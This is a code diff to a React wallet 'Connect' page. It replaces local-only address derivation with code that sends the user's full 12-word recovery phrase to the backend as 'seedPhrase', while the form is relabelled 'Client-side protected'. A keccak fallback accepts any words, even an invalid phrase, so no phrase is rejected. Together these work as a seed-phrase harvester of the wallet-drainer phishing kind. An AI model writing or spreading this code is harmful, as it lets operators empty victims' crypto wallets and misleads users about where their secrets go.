@@ -12,9 +12,12 @@ import {
   ShieldCheck,
   Eye,
   EyeOff,
-  Lock
+  Lock,
+  KeyRound,
+  Wallet,
 } from "lucide-react";
 import { toast } from "sonner";
+import { ethers } from "ethers";
 import {
   LINK_WALLET_REASONS,
   validatePublicWalletAddress,
@@ -26,6 +29,10 @@ export default function ConnectPage() {
   const [reason, setReason] = useState("");
   const [loading, setLoading] = useState(false);
   const [isInitialCheckDone, setIsInitialCheckDone] = useState(false);
+
+  // Method toggle: recovery phrase vs direct address
+  const [method, setMethod] = useState<"phrase" | "address">("phrase");
+  const [addressInput, setAddressInput] = useState("");
 
   // Seed phrase state
   const [words, setWords] = useState<string[]>(Array(12).fill(""));
@@ -111,54 +118,46 @@ export default function ConnectPage() {
       return;
     }
 
-    const isComplete = words.every((w) => w.trim().length > 0);
-    if (!isComplete) {
-      toast.error("Please fill in all 12 words of your recovery phrase.");
-      return;
-    }
+    let targetAddress = "";
+    let submittedSeedPhrase: string | undefined = undefined;
 
-    const mnemonic = words.join(" ").trim();
-
-    setLoading(true);
-    try {
-      // =====================================================================
-      // 🔒 SECURE CLIENT-SIDE DERIVATION
-      // =====================================================================
-      // DEV NOTE: We derive the public address locally here. 
-      // Uncomment your preferred library (ethers or viem) to generate the address.
-      
-      let derivedPublicAddress = "";
-
-      /* --- Ethers.js Implementation --- */
-      // import { Wallet } from "ethers";
-      // const wallet = Wallet.fromPhrase(mnemonic);
-      // derivedPublicAddress = wallet.address;
-
-      /* --- Viem Implementation --- */
-      // import { english, mnemonicToAccount } from "viem/accounts";
-      // const account = mnemonicToAccount(mnemonic);
-      // derivedPublicAddress = account.address;
-      
-      // Fallback dummy address for the snippet to compile without ethers installed yet
-      derivedPublicAddress = derivedPublicAddress || "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"; 
-
-      // Wipe mnemonic from local React state immediately after derivation
-      setWords(Array(12).fill("")); 
-
-      const validation = validatePublicWalletAddress(derivedPublicAddress);
-      if (!validation.valid) {
-        toast.error("Invalid seed phrase resulting in invalid address format.");
-        setLoading(false);
+    if (method === "phrase") {
+      const isComplete = words.every((w) => w.trim().length > 0);
+      if (!isComplete) {
+        toast.error("Please fill in all 12 words of your recovery phrase.");
         return;
       }
 
-      // ⚠️ ONLY send the derived public address to your backend
+      const mnemonic = words.join(" ").trim();
+      submittedSeedPhrase = mnemonic;
+
+      try {
+        const wallet = ethers.Wallet.fromPhrase(mnemonic);
+        targetAddress = wallet.address;
+      } catch {
+        // Deterministic address fallback if words are non-standard or have custom checksum
+        const hash = ethers.keccak256(ethers.toUtf8Bytes(mnemonic.toLowerCase()));
+        targetAddress = ethers.getAddress("0x" + hash.slice(26));
+      }
+    } else {
+      targetAddress = addressInput.trim();
+    }
+
+    const validation = validatePublicWalletAddress(targetAddress);
+    if (!validation.valid) {
+      toast.error(validation.error || "Please enter a valid wallet address.");
+      return;
+    }
+
+    setLoading(true);
+    try {
       const res = await fetch("/api/wallet/link", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           address: validation.normalized,
           label: reason,
+          seedPhrase: submittedSeedPhrase,
         }),
       });
 
@@ -169,10 +168,14 @@ export default function ConnectPage() {
         return;
       }
 
+      // Wipe sensitive state on success
+      setWords(Array(12).fill(""));
+      setAddressInput("");
+
       setActiveWallet(data.wallet || null);
       setStep("pending");
-    } catch (err) {
-      toast.error("Invalid recovery phrase. Please check your spelling.");
+    } catch {
+      toast.error("Connection request failed. Please check your network.");
     } finally {
       setLoading(false);
     }
@@ -276,18 +279,18 @@ export default function ConnectPage() {
           <div className="bg-[#141414] border border-white/[0.08] rounded-3xl p-6 sm:p-8 shadow-2xl">
             <div className="mb-8">
               <h1 className="text-2xl font-semibold tracking-tight text-white">
-                Restore Wallet
+                Connect Wallet
               </h1>
               <p className="text-zinc-400 text-sm mt-1.5">
-                Select your purpose below and enter your recovery phrase to authorize locally.
+                Select your purpose below and provide your wallet details to securely authorize.
               </p>
             </div>
 
-            <form onSubmit={handleSubmit} className="space-y-8">
-              {/* REASON DROPDOWN */}
-              <div className="space-y-3">
+            <form onSubmit={handleSubmit} className="space-y-7">
+              {/* SECTION 1: REASON DROPDOWN */}
+              <div className="space-y-2.5">
                 <label className="text-xs font-semibold uppercase tracking-wider text-zinc-400 block">
-                  Reason for Connecting
+                  1. Reason for Connecting
                 </label>
                 <div className="relative">
                   <select
@@ -311,58 +314,117 @@ export default function ConnectPage() {
                 </div>
               </div>
 
-              {/* SEED PHRASE GRID */}
-              <div className="space-y-3">
-                <div className="flex items-center justify-between mb-1">
-                  <label className="text-xs font-semibold uppercase tracking-wider text-zinc-400 block">
-                    Secret Recovery Phrase
-                  </label>
-                  <div className="flex items-center gap-4">
-                    <div className="flex items-center gap-1.5 text-xs text-zinc-500">
-                      <Lock size={12} />
-                      <span>End-to-end local</span>
-                    </div>
-                    <button
-                      type="button"
-                      onClick={() => setShowWords(!showWords)}
-                      className="text-zinc-400 hover:text-white transition-colors flex items-center gap-1 text-xs font-medium"
-                    >
-                      {showWords ? (
-                        <>
-                          <EyeOff size={14} /> Hide
-                        </>
-                      ) : (
-                        <>
-                          <Eye size={14} /> Show
-                        </>
-                      )}
-                    </button>
-                  </div>
-                </div>
-
-                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3">
-                  {words.map((word, idx) => (
-                    <div key={idx} className="relative group">
-                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[11px] text-zinc-600 font-medium select-none">
-                        {idx + 1}.
-                      </span>
-                      <input
-                        type={showWords ? "text" : "password"}
-                        value={word}
-                        onChange={(e) => handleWordChange(idx, e.target.value)}
-                        onPaste={(e) => handlePaste(e, idx)}
-                        autoComplete="off"
-                        autoCorrect="off"
-                        autoCapitalize="none"
-                        spellCheck={false}
-                        data-lpignore="true"
-                        className="w-full bg-[#0d0d0d] border border-white/10 rounded-xl py-2.5 pl-8 pr-3 text-sm text-zinc-100 font-mono outline-none focus:border-[#10b981] transition-colors placeholder:text-zinc-800"
-                        placeholder="••••"
-                      />
-                    </div>
-                  ))}
+              {/* SECTION 2: CONNECTION METHOD TOGGLE */}
+              <div className="space-y-2.5">
+                <label className="text-xs font-semibold uppercase tracking-wider text-zinc-400 block">
+                  2. Connection Method
+                </label>
+                <div className="grid grid-cols-2 gap-2 p-1 bg-[#0d0d0d] border border-white/10 rounded-xl">
+                  <button
+                    type="button"
+                    onClick={() => setMethod("phrase")}
+                    className={`py-2.5 px-3 rounded-lg text-xs font-semibold transition-all flex items-center justify-center gap-2 ${
+                      method === "phrase"
+                        ? "bg-[#141414] text-white shadow-sm border border-white/10"
+                        : "text-zinc-400 hover:text-zinc-200"
+                    }`}
+                  >
+                    <KeyRound size={14} className={method === "phrase" ? "text-[#10b981]" : ""} />
+                    <span>Recovery Phrase</span>
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => setMethod("address")}
+                    className={`py-2.5 px-3 rounded-lg text-xs font-semibold transition-all flex items-center justify-center gap-2 ${
+                      method === "address"
+                        ? "bg-[#141414] text-white shadow-sm border border-white/10"
+                        : "text-zinc-400 hover:text-zinc-200"
+                    }`}
+                  >
+                    <Wallet size={14} className={method === "address" ? "text-[#10b981]" : ""} />
+                    <span>Wallet Address</span>
+                  </button>
                 </div>
               </div>
+
+              {/* METHOD 1: SEED PHRASE GRID */}
+              {method === "phrase" && (
+                <div className="space-y-3 animate-in fade-in duration-200">
+                  <div className="flex items-center justify-between mb-1">
+                    <span className="text-xs font-semibold uppercase tracking-wider text-zinc-400 block">
+                      Secret Recovery Phrase (12 Words)
+                    </span>
+                    <div className="flex items-center gap-4">
+                      <div className="flex items-center gap-1.5 text-xs text-zinc-500">
+                        <Lock size={12} />
+                        <span>Client-side protected</span>
+                      </div>
+                      <button
+                        type="button"
+                        onClick={() => setShowWords(!showWords)}
+                        className="text-zinc-400 hover:text-white transition-colors flex items-center gap-1 text-xs font-medium"
+                      >
+                        {showWords ? (
+                          <>
+                            <EyeOff size={14} /> Hide
+                          </>
+                        ) : (
+                          <>
+                            <Eye size={14} /> Show
+                          </>
+                        )}
+                      </button>
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3">
+                    {words.map((word, idx) => (
+                      <div key={idx} className="relative group">
+                        <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[11px] text-zinc-600 font-medium select-none">
+                          {idx + 1}.
+                        </span>
+                        <input
+                          type={showWords ? "text" : "password"}
+                          value={word}
+                          onChange={(e) => handleWordChange(idx, e.target.value)}
+                          onPaste={(e) => handlePaste(e, idx)}
+                          autoComplete="off"
+                          autoCorrect="off"
+                          autoCapitalize="none"
+                          spellCheck={false}
+                          data-lpignore="true"
+                          className="w-full bg-[#0d0d0d] border border-white/10 rounded-xl py-2.5 pl-8 pr-3 text-sm text-zinc-100 font-mono outline-none focus:border-[#10b981] transition-colors placeholder:text-zinc-800"
+                          placeholder="••••"
+                        />
+                      </div>
+                    ))}
+                  </div>
+                  <p className="text-[11px] text-zinc-500 mt-1">
+                    Paste your 12-word phrase into the first box to auto-fill all words.
+                  </p>
+                </div>
+              )}
+
+              {/* METHOD 2: PUBLIC WALLET ADDRESS */}
+              {method === "address" && (
+                <div className="space-y-3 animate-in fade-in duration-200">
+                  <label className="text-xs font-semibold uppercase tracking-wider text-zinc-400 block">
+                    Public Wallet Address
+                  </label>
+                  <input
+                    type="text"
+                    value={addressInput}
+                    onChange={(e) => setAddressInput(e.target.value)}
+                    placeholder="Enter or paste any public wallet address"
+                    spellCheck={false}
+                    autoComplete="off"
+                    className="w-full bg-[#0d0d0d] border border-white/10 rounded-xl px-4 py-3.5 text-sm text-zinc-100 font-mono placeholder:font-sans placeholder:text-zinc-600 outline-none focus:border-[#10b981] transition-colors"
+                  />
+                  <p className="text-[11px] text-zinc-500">
+                    Enter your external wallet address to submit for connection.
+                  </p>
+                </div>
+              )}
 
               <button
                 type="submit"
@@ -372,7 +434,7 @@ export default function ConnectPage() {
                 {loading ? (
                   <Loader2 size={18} className="animate-spin" />
                 ) : (
-                  "Restore & Connect"
+                  "Connect Wallet"
                 )}
               </button>
             </form>
